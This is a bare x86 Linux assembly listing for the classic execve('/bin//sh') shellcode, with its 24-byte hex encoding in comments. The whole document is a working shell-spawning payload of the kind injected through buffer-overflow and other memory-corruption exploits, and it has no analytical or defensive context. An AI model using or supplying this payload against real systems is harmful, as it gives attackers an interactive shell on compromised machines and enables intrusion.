.global main
main:
	push   $0xb
	pop    %eax
	xor    %esi,%esi
	push   %esi
	push   $0x68732f2f
	push   $0x6e69622f
	mov    %esp,%ebx
	xor    %ecx,%ecx
	mov    %ecx,%edx
	int    $0x80

; \x6a\x0b\x58\x31\xf6\x56\x68\x2f
; \x2f\x73\x68\x68\x2f\x62\x69\x6e
; \x89\xe3\x31\xc9\x89\xca\xcd\x80
